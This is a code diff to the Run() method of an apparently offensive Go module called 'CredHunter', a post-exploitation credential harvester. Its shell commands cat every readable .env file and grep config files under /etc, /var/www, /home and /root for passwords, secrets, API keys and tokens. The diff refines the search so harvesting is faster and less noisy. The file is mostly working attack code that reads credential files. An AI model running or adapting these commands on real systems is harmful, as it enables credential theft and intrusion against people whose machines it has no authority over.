@@ -116,8 +116,7 @@ func (c *CredHunter) Run() string {
 	b.WriteString("\n")
 
 	b.WriteString("[+] .env FILES\n")
-	b.WriteString(cmd("find / -name '.env' -readable 2>/dev/null | head -20 | xargs -I{} sh -c 'echo \"=== {} ===\"; cat {}'"))
-	b.WriteString(cmd("find / -name '*.env' -readable 2>/dev/null | head -10 | xargs -I{} sh -c 'echo \"=== {} ===\"; cat {}'"))
+	b.WriteString(cmd("find /home /root /var /opt /srv /app /etc -maxdepth 6 -name '.env' -readable 2>/dev/null | head -10 | xargs -I{} sh -c 'echo \"=== {} ===\"; cat {}'"))
 	b.WriteString("\n")
 
 	b.WriteString("[+] CONFIG FILES WITH CREDENTIALS\n")
@@ -135,7 +134,7 @@ func (c *CredHunter) Run() string {
 	b.WriteString("\n")
 
 	b.WriteString("[+] GREP FOR PASSWORDS IN CONFIG FILES\n")
-	b.WriteString(cmd("grep -rEl 'password|passwd|secret|apikey|api_key|token|credential' /etc/ /var/ /opt/ /srv/ /home/ /root/ 2>/dev/null | grep -v Binary | head -30"))
+	b.WriteString(cmd("grep -rEl --include='*.conf' --include='*.cfg' --include='*.ini' --include='*.php' --include='*.env' --include='*.yml' --include='*.yaml' --include='*.json' --include='*.xml' --include='*.properties' --exclude-dir='.git' --exclude-dir='node_modules' --exclude-dir='vendor' 'password|passwd|secret|apikey|api_key|token|credential' /etc/ /var/www/ /opt/ /srv/ /home/ /root/ 2>/dev/null | head -20"))
 	b.WriteString("\n")
 
 	b.WriteString("[+] WEB CONFIG FILES\n")
@@ -181,7 +180,7 @@ func (c *CredHunter) Run() string {
 	b.WriteString("\n")
 
 	b.WriteString("[+] RECENTLY MODIFIED FILES (last 24h)\n")
-	b.WriteString(cmd("find / -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' -newer /tmp -mtime -1 -readable 2>/dev/null | head -50"))
+	b.WriteString(cmd("find /home /root /tmp /var/tmp /opt /srv -not -path '/proc/*' -not -path '/sys/*' -mtime -1 -readable 2>/dev/null | head -30"))
 	b.WriteString("\n")
 
 	return b.String()
